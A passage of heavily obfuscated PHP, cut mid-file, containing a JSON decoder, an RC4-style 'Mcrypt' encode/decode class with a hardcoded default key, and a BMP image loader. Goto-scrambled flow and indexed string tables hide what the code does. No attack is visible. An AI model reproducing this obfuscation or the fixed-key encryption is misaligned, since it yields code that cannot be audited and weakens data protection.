array_push($CØÖ©ÚÊ¾Ü, $this->decode($BğôùŞ†‘é)); } elseif (reset($f­êï£”Á) == SERVICES_JSON_IN_OBJ) { $Dˆ‹‰±¸ğ„ = array(); if (preg_match($d‹Ø­‡ÚÀÆ[1962], $BğôùŞ†‘é, $Dˆ‹‰±¸ğ„)) { $Bä†ƒ‹´Şƒ = $this->decode($Dˆ‹‰±¸ğ„[1]); $bïòì—¸Íƒ = $this->decode($Dˆ‹‰±¸ğ„[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cæµ‡ÂªÄÑ[$Bä†ƒ‹´Şƒ] = $bïòì—¸Íƒ; } else { $Cæµ‡ÂªÄÑ->{$Bä†ƒ‹´Şƒ} = $bïòì—¸Íƒ; } } elseif (preg_match($d‹Ø­‡ÚÀÆ[1963], $BğôùŞ†‘é, $Dˆ‹‰±¸ğ„)) { $Bä†ƒ‹´Şƒ = $Dˆ‹‰±¸ğ„[1]; $bïòì—¸Íƒ = $this->decode($Dˆ‹‰±¸ğ„[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cæµ‡ÂªÄÑ[$Bä†ƒ‹´Şƒ] = $bïòì—¸Íƒ; } else { $Cæµ‡ÂªÄÑ->{$Bä†ƒ‹´Şƒ} = $bïòì—¸Íƒ; } } } } elseif (($Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[113] || $Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[55]) && $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]] != SERVICES_JSON_IN_STR) { array_push($f­êï£”Á, array($d‹Ø­‡ÚÀÆ[1960] => SERVICES_JSON_IN_STR, $d‹Ø­‡ÚÀÆ[263] => $D£ÚïÂ¸å, $d‹Ø­‡ÚÀÆ[1961] => $Cù±·¥®±×[$D£ÚïÂ¸å])); } elseif ($Cù±·¥®±×[$D£ÚïÂ¸å] == $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1961]] && $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]] == SERVICES_JSON_IN_STR && (strlen(substr($Cù±·¥®±×, 0, $D£ÚïÂ¸å)) - strlen(rtrim(substr($Cù±·¥®±×, 0, $D£ÚïÂ¸å), $d‹Ø­‡ÚÀÆ[93]))) % 2 != 1) { array_pop($f­êï£”Á); } elseif ($Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[157] && in_array($A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f­êï£”Á, array($d‹Ø­‡ÚÀÆ[1960] => SERVICES_JSON_IN_ARR, $d‹Ø­‡ÚÀÆ[263] => $D£ÚïÂ¸å, $d‹Ø­‡ÚÀÆ[1961] => !1)); } elseif ($Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[476] && $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]] == SERVICES_JSON_IN_ARR) { array_pop($f­êï£”Á); } elseif ($Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[1068] && in_array($A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f­êï£”Á, array($d‹Ø­‡ÚÀÆ[1960] => SERVICES_JSON_IN_OBJ, $d‹Ø­‡ÚÀÆ[263] => $D£ÚïÂ¸å, $d‹Ø­‡ÚÀÆ[1961] => !1)); } elseif ($Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[315] && $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]] == SERVICES_JSON_IN_OBJ) { array_pop($f­êï£”Á); } elseif ($C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1964] && in_array($A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f­êï£”Á, array($d‹Ø­‡ÚÀÆ[1960] => SERVICES_JSON_IN_CMT, $d‹Ø­‡ÚÀÆ[263] => $D£ÚïÂ¸å, $d‹Ø­‡ÚÀÆ[1961] => !1)); $D£ÚïÂ¸å++; } elseif ($C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1965] && $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]] == SERVICES_JSON_IN_CMT) { array_pop($f­êï£”Á); $D£ÚïÂ¸å++; for ($e¡ëŒäïÇ = $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[263]]; $e¡ëŒäïÇ <= $D£ÚïÂ¸å; ++$e¡ëŒäïÇ) { $Cù±·¥®±× = substr_replace($Cù±·¥®±×, $d‹Ø­‡ÚÀÆ[50], $e¡ëŒäïÇ, 1); } } } if (reset($f­êï£”Á) == SERVICES_JSON_IN_ARR) { return $CØÖ©ÚÊ¾Ü; } elseif (reset($f­êï£”Á) == SERVICES_JSON_IN_OBJ) { return $Cæµ‡ÂªÄÑ; } goto AãÃ«Ü³Õ ; E§êœÕ±’«: $Cù±·¥®±× = $this->reduce_string($Cù±·¥®±×); if ($Cù±·¥®±× == $d‹Ø­‡ÚÀÆ[33]) { if (reset($f­êï£”Á) == SERVICES_JSON_IN_ARR) { return $CØÖ©ÚÊ¾Ü; } else { return $Cæµ‡ÂªÄÑ; } } $fªÛİ‚â¾ó = strlen($Cù±·¥®±×); goto d‡¾É­Áá; bğ…®·Öó¢: if ($FêÚí©Æİ‰[0] == $d‹Ø­‡ÚÀÆ[157]) { $f­êï£”Á = array(SERVICES_JSON_IN_ARR); $CØÖ©ÚÊ¾Ü = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f­êï£”Á = array(SERVICES_JSON_IN_OBJ); $Cæµ‡ÂªÄÑ = array(); } else { $f­êï£”Á = array(SERVICES_JSON_IN_OBJ); $Cæµ‡ÂªÄÑ = new stdClass(); } } array_push($f­êï£”Á, array($d‹Ø­‡ÚÀÆ[1960] => SERVICES_JSON_SLICE, $d‹Ø­‡ÚÀÆ[263] => 0, $d‹Ø­‡ÚÀÆ[1961] => !1)); $Cù±·¥®±× = substr($FêÚí©Æİ‰, 1, -1); goto E§êœÕ±’«; AãÃ«Ü³Õ : } } } function isError($C“·ãâä¦£, $CëõËãÁï = null) { $F‚´‘„¸£˜ =& $_SERVER[”Ì÷ñ­î¸]; if (class_exists($F‚´‘„¸£˜[1966])) { return PEAR::isError($C“·ãâä¦£, $CëõËãÁï); } elseif (is_object($C“·ãâä¦£) && (get_class($C“·ãâä¦£) == $F‚´‘„¸£˜[1967] || is_subclass_of($C“·ãâä¦£, $F‚´‘„¸£˜[1967]))) { return !0; } return !1; } } goto c…ŞÆˆ·âÜ; D†™Øìæ…: class Mcrypt { public static $defaultKey = "\x61\x21\164\x61\x6b\101\72\144\154\155\143\154\x64\x45\x76\54\145"; public static function encode($FÇ›–“‡óÕ, $d¾à¼æ«¼­ = '', $báß£Èõ„õ = 0, $E«¹ë±‹± = '') { goto Aâ÷‰ïà‚ó; EÓŒÆ”—: for ($aœ­‘¹ñÊ = 0; $aœ­‘¹ñÊ <= 255; $aœ­‘¹ñÊ++) { $E³ÜÛİ·Ï[$aœ­‘¹ñÊ] = ord($FÀ‚¯óŠî¡[$aœ­‘¹ñÊ % $A¡­·™­×]); } $E÷ô»İÀ¶¬ = range(0, 255); for ($díÚ¼Ë¦µ = $aœ­‘¹ñÊ = 0; $aœ­‘¹ñÊ < 256; $aœ­‘¹ñÊ++) { $díÚ¼Ë¦µ = ($díÚ¼Ë¦µ + $E÷ô»İÀ¶¬[$aœ­‘¹ñÊ] + $E³ÜÛİ·Ï[$aœ­‘¹ñÊ]) % 256; $CœÑ¥Ùæ¸ = $E÷ô»İÀ¶¬[$aœ­‘¹ñÊ]; $E÷ô»İÀ¶¬[$aœ­‘¹ñÊ] = $E÷ô»İÀ¶¬[$díÚ¼Ë¦µ]; $E÷ô»İÀ¶¬[$díÚ¼Ë¦µ] = $CœÑ¥Ùæ¸; } goto AÄ¨¨ ½’ä; fŞŞõİÎ’Œ: $FÇ›–“‡óÕ = sprintf($FµåãÍˆ„™[1933], $báß£Èõ„õ ? $báß£Èõ„õ + time() : 0) . substr(md5($FÇ›–“‡óÕ . $C„¹¦†Åé), 0, 16) . $FÇ›–“‡óÕ; $C‚ê×ÌÕ“­ = strlen($FÇ›–“‡óÕ); $E³ÜÛİ·Ï = array(); goto EÓŒÆ”—; cîÄÌÀŞ¾Ç: $EÊ¸è¬œ»ù = substr($E«¹ë±‹±, -$A›ºØÚ­ù); $FÀ‚¯óŠî¡ = $fĞ¨ÇåØÚ¿ . md5($fĞ¨ÇåØÚ¿ . $EÊ¸è¬œ»ù); $A¡­·™­× = strlen($FÀ‚¯óŠî¡); goto fŞŞõİÎ’Œ; Aâ÷‰ïà‚ó: $FµåãÍˆ„™ =& $_SERVER[”Ì÷ñ­î¸]; $A›ºØÚ­ù = 4; $d¾à¼æ«¼­ = md5($d¾à¼æ«¼­ ? $d¾à¼æ«¼­ : self::$defaultKey); goto BÕ¤Óï—ëè; AÄ¨¨ ½’ä: $CØŒÙ¥Ï£ = $FµåãÍˆ„™[33]; for ($fÜãŞ¡µ¢— = $díÚ¼Ë¦µ = $aœ­‘¹ñÊ = 0; $aœ­‘¹ñÊ < $C‚ê×ÌÕ“­; $aœ­‘¹ñÊ++) { $fÜãŞ¡µ¢— = ($fÜãŞ¡µ¢— + 1) % 256; $díÚ¼Ë¦µ = ($díÚ¼Ë¦µ + $E÷ô»İÀ¶¬[$fÜãŞ¡µ¢—]) % 256; $CœÑ¥Ùæ¸ = $E÷ô»İÀ¶¬[$fÜãŞ¡µ¢—]; $E÷ô»İÀ¶¬[$fÜãŞ¡µ¢—] = $E÷ô»İÀ¶¬[$díÚ¼Ë¦µ]; $E÷ô»İÀ¶¬[$díÚ¼Ë¦µ] = $CœÑ¥Ùæ¸; $CØŒÙ¥Ï£ .= chr(ord($FÇ›–“‡óÕ[$aœ­‘¹ñÊ]) ^ $E÷ô»İÀ¶¬[($E÷ô»İÀ¶¬[$fÜãŞ¡µ¢—] + $E÷ô»İÀ¶¬[$díÚ¼Ë¦µ]) % 256]); } $CØŒÙ¥Ï£ = $EÊ¸è¬œ»ù . str_replace($FµåãÍˆ„™[909], $FµåãÍˆ„™[33], base64_encode($CØŒÙ¥Ï£)); goto F­ò®±½Ï; BÕ¤Óï—ëè: $fĞ¨ÇåØÚ¿ = md5(substr($d¾à¼æ«¼­, 0, 16)); $C„¹¦†Åé = md5(substr($d¾à¼æ«¼­, 16, 16)); $E«¹ë±‹± = $E«¹ë±‹± ? $E«¹ë±‹± : md5(microtime()); goto cîÄÌÀŞ¾Ç; F­ò®±½Ï: $CØŒÙ¥Ï£ = str_replace(array($FµåãÍˆ„™[284], $FµåãÍˆ„™[8], $FµåãÍˆ„™[909]), array($FµåãÍˆ„™[412], $FµåãÍˆ„™[70], $FµåãÍˆ„™[91]), $CØŒÙ¥Ï£); return $CØŒÙ¥Ï£; goto b‹ä‚Áêæ„; b‹ä‚Áêæ„: } public static function decode($C‘‚‡åŸÑ, $fĞ¦ô®‚Ê­ = '') { goto e‰ëå‰”®ù; dµô‘“åßŠ: if (($cØäõÖæà™ == 0 || $cØäõÖæà™ - time() > 0) && substr($Câ××«ƒ‡‹, 10, 16) == substr(md5(substr($Câ××«ƒ‡‹, 26) . $DöìÜÕÁ), 0, 16)) { return substr($Câ××«ƒ‡‹, 26); } else { return $Cåì›½˜¥Ç[33]; } goto FÎ´ëåÂÌ¦; C¤áó«¢¼: $Câ××«ƒ‡‹ = $Cåì›½˜¥Ç[33]; for ($aêµŠ‚ÀàÄ = $e¸áé³´å = $eĞÜÛÀˆ°¥ = 0; $eĞÜÛÀˆ°¥ < $a¿„ÚÒÃÚ; $eĞÜÛÀˆ°¥++) { $aêµŠ‚ÀàÄ = ($aêµŠ‚ÀàÄ + 1) % 256; $e¸áé³´å = ($e¸áé³´å + $f¤ÍôšŠô[$aêµŠ‚ÀàÄ]) % 256; $b¯îáİ§’“ = $f¤ÍôšŠô[$aêµŠ‚ÀàÄ]; $f¤ÍôšŠô[$aêµŠ‚ÀàÄ] = $f¤ÍôšŠô[$e¸áé³´å]; $f¤ÍôšŠô[$e¸áé³´å] = $b¯îáİ§’“; $Câ××«ƒ‡‹ .= chr(ord($C‘‚‡åŸÑ[$eĞÜÛÀˆ°¥]) ^ $f¤ÍôšŠô[($f¤ÍôšŠô[$aêµŠ‚ÀàÄ] + $f¤ÍôšŠô[$e¸áé³´å]) % 256]); } $cØäõÖæà™ = intval(substr($Câ××«ƒ‡‹, 0, 10)); goto dµô‘“åßŠ; DÙ‚÷Ú’: $C‘‚‡åŸÑ = base64_decode(substr($C‘‚‡åŸÑ, $dà¼ˆÃ§öÎ)); $a¿„ÚÒÃÚ = strlen($C‘‚‡åŸÑ); $D„¬î’—‹ë = array(); goto e»İĞëÒó™; fÖ×¤Ö˜«™: $eÀáÖõßñ‡ = substr($C‘‚‡åŸÑ, 0, $dà¼ˆÃ§öÎ); $F¡ßØ¶¹®° = $cÆÛßÙ´ˆß . md5($cÆÛßÙ´ˆß . $eÀáÖõßñ‡); $a‘…–“‚Ù‚ = strlen($F¡ßØ¶¹®°); goto DÙ‚÷Ú’; AÑ¬ËÓÍèÜ: $fĞ¦ô®‚Ê­ = md5($fĞ¦ô®‚Ê­ ? $fĞ¦ô®‚Ê­ : self::$defaultKey); $cÆÛßÙ´ˆß = md5(substr($fĞ¦ô®‚Ê­, 0, 16)); $DöìÜÕÁ = md5(substr($fĞ¦ô®‚Ê­, 16, 16)); goto fÖ×¤Ö˜«™; e‰ëå‰”®ù: $Cåì›½˜¥Ç =& $_SERVER[”Ì÷ñ­î¸]; $C‘‚‡åŸÑ = str_replace(array($Cåì›½˜¥Ç[412], $Cåì›½˜¥Ç[70], $Cåì›½˜¥Ç[91]), array($Cåì›½˜¥Ç[284], $Cåì›½˜¥Ç[8], $Cåì›½˜¥Ç[909]), $C‘‚‡åŸÑ); $dà¼ˆÃ§öÎ = 4; goto AÑ¬ËÓÍèÜ; e»İĞëÒó™: for ($eĞÜÛÀˆ°¥ = 0; $eĞÜÛÀˆ°¥ <= 255; $eĞÜÛÀˆ°¥++) { $D„¬î’—‹ë[$eĞÜÛÀˆ°¥] = ord($F¡ßØ¶¹®°[$eĞÜÛÀˆ°¥ % $a‘…–“‚Ù‚]); } $f¤ÍôšŠô = range(0, 255); for ($e¸áé³´å = $eĞÜÛÀˆ°¥ = 0; $eĞÜÛÀˆ°¥ < 256; $eĞÜÛÀˆ°¥++) { $e¸áé³´å = ($e¸áé³´å + $f¤ÍôšŠô[$eĞÜÛÀˆ°¥] + $D„¬î’—‹ë[$eĞÜÛÀˆ°¥]) % 256; $b¯îáİ§’“ = $f¤ÍôšŠô[$eĞÜÛÀˆ°¥]; $f¤ÍôšŠô[$eĞÜÛÀˆ°¥] = $f¤ÍôšŠô[$e¸áé³´å]; $f¤ÍôšŠô[$e¸áé³´å] = $b¯îáİ§’“; } goto C¤áó«¢¼; FÎ´ëåÂÌ¦: } } define($_SERVER[”Ì÷ñ­î¸][1934], 1); define($_SERVER[”Ì÷ñ­î¸][1935], 2); goto E›ä‹°ÒÛ; C•¼î±Å·: class ImageGdBMP { public static function load($c’œğ…³À) { $eàÒ¥£¾©È = fopen($c’œğ…³À, $_SERVER[”Ì÷ñ­î¸][1523]); if ($eàÒ¥£¾©È === !1) { return !1; } $DµòØÌÂ¢Â = self::loadFromStream($eàÒ¥£¾©È); fclose($eàÒ¥£¾©È); return $DµòØÌÂ¢Â; } public static function loadFromStream($AÒà¸èå«Ê) { $d©‰‰ÉªÈ¡ =& $_SERVER[”Ì÷ñ­î¸]; $EÃÆá‘ïïÍ = fread($AÒà¸èå«Ê, 14); if ($EÃÆá‘ïïÍ === !1) { return !1; } if ($EÃÆá‘ïïÍ[0] != $d©‰‰ÉªÈ¡[1834] || $EÃÆá‘ïïÍ[1] != $d©‰‰ÉªÈ¡[1835]) { return !1; } $Bğáˆ¹Ôæ— = unpack($d©‰‰ÉªÈ¡[1836] . $d©‰‰ÉªÈ¡[1837] . $d©‰‰ÉªÈ¡[1838] . $d©‰‰ÉªÈ¡[1839] . $d©‰‰ÉªÈ¡[1840], $EÃÆá‘ïïÍ); return self::loadFromStreamAndFileHeader($AÒà¸èå«Ê, $Bğáˆ¹Ôæ—); } public static function loadFromStreamAndFileHeader($dÛÁ¡Ò¬ì, array $dÔ¯“«åµ­) { goto EïÜ£‡ğ“â; EïÜ£‡ğ“â: $B¥ªÛÙÚÛã =& $_SERVER[”Ì÷ñ­î¸]; if ($dÔ¯“«åµ­[$B¥ªÛÙÚÛã[388]] != 19778) { return !1; } $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, 4); goto a§Ëä†ÇÇò; B‡›»¯ò‹”: if ($AÔÈ¤ÑÇ„ø == 1 || $AÔÈ¤ÑÇ„ø == 4 || $AÔÈ¤ÑÇ„ø == 8) { goto AÏá×¯ØºÓ; f°ïÎòÏ‰ã: $F†ÍµÃ´±× = (1 << $AÔÈ¤ÑÇ„ø) - 1 << $D£Ê¤å®†­; if ($CŒ¤ñò­·¶ == 1 || $CŒ¤ñò­·¶ == 2) { $BÔâóë›Ï = 0; $f®Éìè»¬ã = $AÔÈ¤ÑÇ„ø >> 2 & 1; for (;;) { if ($BÔâóë›Ï < -1 || $BÔâóë›Ï > $b•ä—™óôÂ || $Eøóõ¦Œ¬ < -1 || $Eøóõ¦Œ¬ > $c ¼©Ó«…â) { imagedestroy($bºœÈàçË); return !1; } $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, 1); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } switch ($B¦¬¾Œ Ê›) { case $B¥ªÛÙÚÛã[1859]: $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, 1); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } switch ($B¦¬¾Œ Ê›) { case $B¥ªÛÙÚÛã[1859]: $Eøóõ¦Œ¬ += $EÙè¯Úàƒã; $BÔâóë›Ï = 0; break; case $B¥ªÛÙÚÛã[1861]: $Eøóõ¦Œ¬ = 0; $BÔâóë›Ï = 0; break 3; case $B¥ªÛÙÚÛã[1862]: $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, 2); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } list(, $C–‰™²˜‘ƒ, $b‰±­µïí) = unpack($B¥ªÛÙÚÛã[1863], $B¦¬¾Œ Ê›); $BÔâóë›Ï += $C–‰™²˜‘ƒ; $Eøóõ¦Œ¬ += $b‰±­µïí * $EÙè¯Úàƒã; break; default: list(, $CåõÅí©¼Ü) = unpack($B¥ªÛÙÚÛã[1864], $B¦¬¾Œ Ê›); $FÖÙâ¬æ‹Ş = ($CåõÅí©¼Ü >> $f®Éìè»¬ã) + ($CåõÅí©¼Ü & $f®Éìè»¬ã); $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, $FÖÙâ¬æ‹Ş + 1 & ~1); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } for ($B¸¢×Ã‚ö = 0, $fÆÖĞç£š = 0; $B¸¢×Ã‚ö < $CåõÅí©¼Ü; ++$B¸¢×Ã‚ö, ++$BÔâóë›Ï, $fÆÖĞç£š += $AÔÈ¤ÑÇ„ø) { list(, $d¾™Âœƒ‰ô) = unpack($B¥ªÛÙÚÛã[1864], $B¦¬¾Œ Ê›[$fÆÖĞç£š >> 3]); $Béİ…ÔÄ“İ = $fÆÖĞç£š & 7; imagesetpixel($bºœÈàçË, $BÔâóë›Ï, $Eøóõ¦Œ¬, $aº²Î©Ã™[($d¾™Âœƒ‰ô & $F†ÍµÃ´±× >> $Béİ…ÔÄ“İ) >> $D£Ê¤å®†­ - $Béİ…ÔÄ“İ]); } break; } break; default: $FÚŸíö‰õÔ = fread($dÛÁ¡Ò¬ì, 1); if ($FÚŸíö‰õÔ === !1) { imagedestroy($bºœÈàçË); return !1; } list(, $eë“¯¨µ¦‡, $d¾™Âœƒ‰ô) = unpack($B¥ªÛÙÚÛã[1863], $B¦¬¾Œ Ê› . $FÚŸíö‰õÔ); for ($B¸¢×Ã‚ö = 0, $fÆÖĞç£š = 0; $B¸¢×Ã‚ö < $eë“¯¨µ¦‡; ++$B¸¢×Ã‚ö, ++$BÔâóë›Ï, $fÆÖĞç£š += $AÔÈ¤ÑÇ„ø) { $Béİ…ÔÄ“İ = $fÆÖĞç£š & 7; imagesetpixel($bºœÈàçË, $BÔâóë›Ï, $Eøóõ¦Œ¬, $aº²Î©Ã™[($d¾™Âœƒ‰ô & $F†ÍµÃ´±× >> $Béİ…ÔÄ“İ) >> $D£Ê¤å®†­ - $Béİ…ÔÄ“İ]); } break; } } } else { for ($cî°µÌõòË = 0; $cî°µÌõòË < $C×Ì·Ä£Ù¥; ++$cî°µÌõòË, $Eøóõ¦Œ¬ += $EÙè¯Úàƒã) { $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, $b§ŠÜ å×); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } $fÆÖĞç£š = 0; for ($BÔâóë›Ï = 0; $BÔâóë›Ï < $b•ä—™óôÂ; ++$BÔâóë›Ï, $fÆÖĞç£š += $AÔÈ¤ÑÇ„ø) { list(, $d¾™Âœƒ‰ô) = unpack($B¥ªÛÙÚÛã[1864], $B¦¬¾Œ Ê›[$fÆÖĞç£š >> 3]); $Béİ…ÔÄ“İ = $fÆÖĞç£š & 7; imagesetpixel($bºœÈàçË, $BÔâóë›Ï, $Eøóõ¦Œ¬, $aº²Î©Ã™[($d¾™Âœƒ‰ô & $F†ÍµÃ´±× >> $Béİ…ÔÄ“İ) >> $D£Ê¤å®†­ - $Béİ…ÔÄ“İ]); } } } goto EÚ„ ÊùÛ; AÏá×¯ØºÓ: $bºœÈàçË = imagecreate($b•ä—™óôÂ, $C×Ì·Ä£Ù¥); $B¹ñãÍ±¶ = $bâ¤ÈÎ¦‹¨ == 12 ? 3 : 4; $F¤ù°…÷Ÿé = $Fè¿‰ºù« ? $Fè¿‰ºù« : pow(2, $AÔÈ¤ÑÇ„ø); goto a±´ãòƒ£å; a±´ãòƒ£å: $aº²Î©Ã™ = array(); for ($B¸¢×Ã‚ö = 0; $B¸¢×Ã‚ö < $F¤ù°…÷Ÿé; ++$B¸¢×Ã‚ö) { $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, $B¹ñãÍ±¶); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } extract(unpack($B¥ªÛÙÚÛã[1860], $B¦¬¾Œ Ê› . $B¥ªÛÙÚÛã[1859])); $aº²Î©Ã™[] = imagecolorallocate($bºœÈàçË, $c²Âà˜âĞ, $D¥‰Ó˜Ç¢¸, $Béİ…ÔÄ“İ); } $D£Ê¤å®†­ = 8 - $AÔÈ¤ÑÇ„ø; goto f°ïÎòÏ‰ã; EÚ„ ÊùÛ: } else { goto cå…¬æ·Áö; B–´¼ÌÏ÷: $e‚Äˆ‡õà† = $AÔÈ¤ÑÇ„ø >> 3; $e¹ãõèªÀî = $eËæáĞŒÍù ? 127 : 0; $B‰éË­ÑŠ = $eËæáĞŒÍù ? 1 / $eËæáĞŒÍù : 1; goto f‡Îé¾œ¸™; f‡Îé¾œ¸™: $bÔË¾™´›º = $A˜ÚÏÍÜÚÉ ? 1 / $A˜ÚÏÍÜÚÉ : 1; $A’ŞÁŞ = $d²¸‰³²ø ? 1 / $d²¸‰³²ø : 1; $e¶Õè–ºÍ¡ = $DïÓè¨º’£ ? 1 / $DïÓè¨º’£ : 1; goto AîÖµõÕ‹‹; cå…¬æ·Áö: $bºœÈàçË = imagecreatetruecolor($b•ä—™óôÂ, $C×Ì·Ä£Ù¥); imagealphablending($bºœÈàçË, !1); if ($eËæáĞŒÍù) { imagesavealpha($bºœÈàçË, !0); } goto B–´¼ÌÏ÷; AîÖµõÕ‹‹: for ($cî°µÌõòË = 0; $cî°µÌõòË < $C×Ì·Ä£Ù¥; ++$cî°µÌõòË, $Eøóõ¦Œ¬ += $EÙè¯Úàƒã) { $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, $b§ŠÜ å×); if ($B¦¬¾Œ Ê› === !1) { imagedestroy($bºœÈàçË); return !1; } $fÆÖĞç£š = 0; for ($BÔâóë›Ï = 0; $BÔâóë›Ï < $b•ä—™óôÂ; ++$BÔâóë›Ï, $fÆÖĞç£š += $e‚Äˆ‡õà†) { list(, $d¾™Âœƒ‰ô) = unpack($B¥ªÛÙÚÛã[1841], substr($B¦¬¾Œ Ê›, $fÆÖĞç£š, $e‚Äˆ‡õà†) . $B¥ªÛÙÚÛã[1865]); $BÇÃ³Å¦Šé = $d¾™Âœƒ‰ô & $eËæáĞŒÍù; $FìÁ¡Ã°ˆ = $d¾™Âœƒ‰ô & $A˜ÚÏÍÜÚÉ; $DÉ‘ñäª×¬ = $d¾™Âœƒ‰ô & $d²¸‰³²ø; $C´¾İõ = $d¾™Âœƒ‰ô & $DïÓè¨º’£; $CôÛÚÓò = $e¹ãõèªÀî - (($BÇÃ³Å¦Šé << 7) - $BÇÃ³Å¦Šé) * $B‰éË­ÑŠ; $c²Âà˜âĞ = (($FìÁ¡Ã°ˆ << 8) - $FìÁ¡Ã°ˆ) * $bÔË¾™´›º; $D¥‰Ó˜Ç¢¸ = (($DÉ‘ñäª×¬ << 8) - $DÉ‘ñäª×¬) * $A’ŞÁŞ; $Béİ…ÔÄ“İ = (($C´¾İõ << 8) - $C´¾İõ) * $e¶Õè–ºÍ¡; imagesetpixel($bºœÈàçË, $BÔâóë›Ï, $Eøóõ¦Œ¬, $CôÛÚÓò << 24 | $c²Âà˜âĞ << 16 | $D¥‰Ó˜Ç¢¸ << 8 | $Béİ…ÔÄ“İ); } } imagealphablending($bºœÈàçË, !0); goto e¼øÂãƒéÁ; e¼øÂãƒéÁ: } return $bºœÈàçË; goto fŠğ¥ÎöÒ¼; c¦ø’ã§œ§: if ($b•ä—™óôÂ == 0 || $c ¼©Ó«…â == 0 || $e¨†³ôöãé != 1 || ($eËæáĞŒÍù & $A˜ÚÏÍÜÚÉ) != 0 || ($eËæáĞŒÍù & $d²¸‰³²ø) != 0 || ($eËæáĞŒÍù & $DïÓè¨º’£) != 0 || ($A˜ÚÏÍÜÚÉ & $d²¸‰³²ø) != 0 || ($A˜ÚÏÍÜÚÉ & $DïÓè¨º’£) != 0 || ($d²¸‰³²ø & $DïÓè¨º’£) != 0) { return !1; } if ($CŒ¤ñò­·¶ == 4 || $CŒ¤ñò­·¶ == 5) { $B¦¬¾Œ Ê› = stream_get_contents($dÛÁ¡Ò¬ì, $F­‚¡˜æ); if ($B¦¬¾Œ Ê› === !1) { return !1; } return imagecreatefromstring($B¦¬¾Œ Ê›); } $b§ŠÜ å× = $b•ä—™óôÂ * $AÔÈ¤ÑÇ„ø + 31 >> 3 & ~3; goto AÅèŠéƒæÂ; AÅèŠéƒæÂ: $C×Ì·Ä£Ù¥ = abs($c ¼©Ó«…â); $Eøóõ¦Œ¬ = $c ¼©Ó«…â > 0 ? $C×Ì·Ä£Ù¥ - 1 : 0; $EÙè¯Úàƒã = $c ¼©Ó«…â > 0 ? -1 : 1; goto B‡›»¯ò‹”; a§Ëä†ÇÇò: if ($B¦¬¾Œ Ê› === !1) { return !1; } list(, $bâ¤ÈÎ¦‹¨) = unpack($B¥ªÛÙÚÛã[1841], $B¦¬¾Œ Ê›); if ($bâ¤ÈÎ¦‹¨ == 12) { goto Fˆ¹¦ì™ŠÑ; Fˆ¹¦ì™ŠÑ: $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, $bâ¤ÈÎ¦‹¨ - 4); if ($B¦¬¾Œ Ê› === !1) { return !1; } extract(unpack($B¥ªÛÙÚÛã[1842] . $B¥ªÛÙÚÛã[1843] . $B¥ªÛÙÚÛã[1844] . $B¥ªÛÙÚÛã[1845], $B¦¬¾Œ Ê›)); goto a±ø ƒ¡ÉÔ; a±ø ƒ¡ÉÔ: $Fè¿‰ºù« = $F„Ş¹Õ¯â = $eËæáĞŒÍù = $CŒ¤ñò­·¶ = 0; $A˜ÚÏÍÜÚÉ = 16711680; $d²¸‰³²ø = 65280; goto AŸ¤À©Œ; AŸ¤À©Œ: $DïÓè¨º’£ = 255; goto d´¶ãíƒñé; d´¶ãíƒñé: } else { if (124 < $bâ¤ÈÎ¦‹¨ || $bâ¤ÈÎ¦‹¨ < 40) { return !1; } else { goto FÄÒŒ”ãÎ; FÄÒŒ”ãÎ: $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, 36); if ($B¦¬¾Œ Ê› === !1) { return !1; } extract(unpack($B¥ªÛÙÚÛã[1846] . $B¥ªÛÙÚÛã[1847] . $B¥ªÛÙÚÛã[1844] . $B¥ªÛÙÚÛã[1848] . $B¥ªÛÙÚÛã[1849] . $B¥ªÛÙÚÛã[1850] . $B¥ªÛÙÚÛã[1851] . $B¥ªÛÙÚÛã[1852] . $B¥ªÛÙÚÛã[1853] . $B¥ªÛÙÚÛã[1854], $B¦¬¾Œ Ê›)); goto Eç†î‘››ò; Eç†î‘››ò: if ($b•ä—™óôÂ & 2147483648) { 